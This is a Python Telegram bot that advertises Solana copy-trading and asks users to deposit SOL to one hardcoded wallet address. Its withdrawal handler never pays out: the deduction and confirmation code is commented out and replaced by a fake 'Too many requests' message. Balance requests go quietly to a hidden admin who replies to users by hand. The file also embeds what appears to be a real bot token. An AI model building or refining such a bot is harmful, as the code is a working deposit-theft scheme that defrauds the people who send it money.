from telegram import Update, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
 )
import asyncio
from datetime import datetime

# Replace 'YOUR_BOT_TOKEN' and 'ADMIN_CHAT_ID' with actual values
BOT_TOKEN = "7654458030:AAEdaH81aN6Q-jWIkdUjBf9oMLWc9jBT4qs"
ADMIN_CHAT_ID = 7142580406  # Replace this with your admin chat ID

# Conversation states for withdrawal
WALLET_ADDRESS, AMOUNT = range(2)

# In-memory balance store (for demo purposes)
user_balances = {}

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Solana's fastest bot to copy trade any coin (SPL token) - To start trading, deposit SOL to your Fiat wallet address \n What can i help you with today? Use the bottons below to interact.")

# Wallet command
async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    wallet_address = "8CEkNWWi6ipY79Wjmubip65Gvy7EWvFMQKv3gLK3wzaV"
    await update.message.reply_text(f"Your wallet address:  {wallet_address}  Copy the address and send SOL to deposit.")

# Balance command
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    username = update.effective_user.username or "Unknown"

    # Notify the user that data is being fetched
    await update.message.reply_text("Fetching Balance PLease Wait...")

    # Send balance request notification to the admin
    balance = user_balances.get(user_id, 100)  # Default balance = 100 USDT for new users
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"User @{username} (ID: {user_id}) has requested their balance. Current balance: {balance} USDT."
    )

    # Uncomment this line if you want the balance to be displayed later:
    # await update.message.reply_text(f"Your current balance: {balance} USDT")

# Admin reply handler
async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Ensure this command is only processed from the admin
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return  # Ignore messages not from the admin

    # Split the message into parts: /reply <user_id> <message>
    command_parts = update.message.text.split(maxsplit=2)

    if len(command_parts) < 3:
        await update.message.reply_text("Usage: /reply <user_id> <your message>")
        return

    # Extract user ID and reply message
    user_id_raw = command_parts[1]
    reply_message = command_parts[2]

    # Validate that the user_id is a valid integer
    if not user_id_raw.isdigit():
        await update.message.reply_text("Error: The user ID must be a valid number.")
        return

    user_id = int(user_id_raw)
    print(user_id)
    # Send the reply to the target user
    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"{reply_message}"
        )
        await update.message.reply_text(f"Message successfully sent to user {user_id}.")
    except Exception as e:
        await update.message.reply_text(f"Failed to send message: {e}")

# Withdraw command - Step 1: Ask for wallet address
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "To withdraw, please provide your wallet address.",
        reply_markup=ReplyKeyboardRemove()
    )
    return WALLET_ADDRESS

# Withdraw Step 2: Get wallet address and ask for amount
async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["wallet_address"] = update.message.text.strip()
    await update.message.reply_text("Got it! Now, please enter the amount you'd like to withdraw.")
    return AMOUNT

# Withdraw Step 3: Validate amount and process withdrawal
async def amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    wallet = context.user_data.get("wallet_address")
    amount_text = update.message.text.strip()

    # Validate the amount
    if not amount_text.isdigit() or int(amount_text) <= 0:
        await update.message.reply_text("Invalid amount. Please enter a positive number.")
        return AMOUNT

    amount = int(amount_text)

    # Initialize balance if the user is new
    if user_id not in user_balances:
        user_balances[user_id] = 100

    # Check if the user has sufficient balance
    if user_balances[user_id] < amount:
        await update.message.reply_text(
            f"Insufficient balance. Your current balance is {user_balances[user_id]} USDT."
        )
        return ConversationHandler.END

    # Deduct the balance and confirm withdrawal
    #user_balances[user_id] -= amount
    #timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # await update.message.reply_text(
    #     f"Withdrawal successful!\n\n"
    #     f"Amount: {amount} USDT\n"
    #     f"Wallet Address: {wallet}\n"
    #     f"Transaction Time: {timestamp}\n"
    #     f"Remaining Balance: {user_balances[user_id]} USDT"
    # )
    await update.message.reply_text("Too many requests at the same time, please wait..."),
    return ConversationHandler.END

# Cancel the withdrawal process
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Withdrawal process canceled.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Copy trade command
async def copytrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
    copy_wallet = "5k8s9uWoCJ9Nzoz3tAyN8TbvLK3zNdLk8B1YZ8MT2oAp"
    await update.message.reply_text(f"Copied wallet address: {copy_wallet}")

# Main function

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Conversation handler for withdrawal process
    withdraw_handler = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw)],
        states={
            WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("wallet", wallet))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(withdraw_handler)
    app.add_handler(CommandHandler("copytrade", copytrade))
    app.add_handler(MessageHandler(filters.TEXT & filters.Chat(ADMIN_CHAT_ID), admin_reply))

    print("Bot is running...")

    try:
        # Run the bot within a fresh event loop
        asyncio.run(app.run_polling())
    except RuntimeError as e:
        if str(e) == "Event loop is closed":
            # Handle environments with closed event loops
            asyncio.set_event_loop(asyncio.new_event_loop())
            asyncio.run(app.run_polling())

if __name__ == "__main__":
    main()